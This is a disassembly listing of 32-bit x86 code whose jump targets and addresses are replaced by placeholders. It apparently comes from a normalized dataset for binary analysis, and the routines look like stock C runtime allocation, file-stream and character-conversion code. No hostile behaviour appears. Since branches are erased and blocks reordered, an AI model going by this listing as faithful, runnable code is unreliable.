push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_40bb4a
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_40ac0b
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_40a005
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_40b6ae
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_40a08e
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_405360
add esp 0xc
sub_40a12a
inc [ rw-data ]
push 0x1000
call sub_40734d
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40a16e
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_406342
push esi
call sub_40a196
push esi
mov edi eax
mov ebx edx
call sub_406394
add esp 0xc
mov eax edi
mov edx ebx
pop edi
pop esi
pop ebx
retn
sub_40a196
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] eax
mov [ ebp - 0x8 ] esi
jge r-xdata
push 0x1
push eax
push eax
push esi
call sub_40ca18
mov ecx edx
add esp 0x10
mov ebx eax
mov [ ebp - 0xc ] ecx
test ecx ecx
mov [ ebp - 0x10 ] ebx
jg r-xdata
mov [ edi + 0x4 ] eax
test [ edi + 0xc ] 0x108
jne r-xdata
jl r-xdata
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ecx eax
sub ecx edx
mov [ ebp - 0x4 ] ecx
mov ecx [ edi + 0xc ]
test cl 0x3
je r-xdata
mov eax [ edi + 0x4 ]
cdq
sub ebx eax
sbb ecx edx
mov eax ebx
mov edx ecx
jmp r-xdata
or edx 0xffffffff
mov eax edx
jmp r-xdata
test ebx ebx
jb r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or ebx [ ebp - 0xc ]
jne r-xdata
call sub_406dfe
mov [ eax ] 0x16
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
add eax [ ebp - 0x10 ]
adc edx [ ebp - 0xc ]
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x4 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x4 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x10 ] eax
sbb [ ebp - 0xc ] 0x0
push 0x2
push 0x0
push 0x0
push [ ebp - 0x8 ]
call sub_40ca18
add esp 0x10
cmp eax [ ebp - 0x10 ]
jne r-xdata
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
call sub_40ca18
mov eax 0x200
add esp 0x10
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
sub_40a326
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_406342
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a355
push [ ebp + 0x8 ]
mov esi eax
call sub_406394
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_40a355
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_406dfe
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_40662f
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_40a196
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x10 ]
call sub_40ca18
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test ah 0x4
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_40a3e6
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_40bdc5
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_406dfe
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_40bd83
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_40be24
pop ecx
mov eax esi
jmp r-xdata
call sub_406e07
mov [ eax ] esi
test esi esi
je r-xdata
sub_40a479
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
test al 0x82
mov [ ebp - 0x4 ] ecx
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
xor ebx ebx
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] ebx
and al 0xef
mov [ ebp + 0xc ] ebx
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov edx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] edx
mov [ esi + 0xc ] eax
mov ebx [ ebp + 0x8 ]
push 0x2
pop edi
lea eax [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp + 0x8 ] bx
call sub_407737
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea edx [ eax + 0x2 ]
mov [ esi ] edx
mov edx [ esi + 0x18 ]
dec edx
dec edx
cmp edi ebx
mov [ esi + 0x4 ] edx
jle r-xdata
push ecx
call sub_40be46
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax ebx
and eax 0xffff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push ecx
call sub_407737
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_40a12a
pop ecx
pop esi
pop ebx
leave
retn
mov eax 0xffff
mov eax rw-data
mov edx ecx
mov eax ecx
sar edx 0x5
and eax 0x1f
mov edx [ edx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ edx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push 0x2
push ebx
push ecx
call sub_40912f
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40a5a0
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a5f9
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_406d15
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_406d76
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a5f9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_406dfe
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40a662
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
mov eax 0xffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40a12a
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0x1
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_408ef1
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
add eax 0xfffffffe
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_40a749
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a7a6
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_406d15
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_406d76
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a7a6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_406dfe
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_40a86f
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40a8b7
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40a8e2
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_405e00
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_40ac0b
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40afc5
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40af14
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
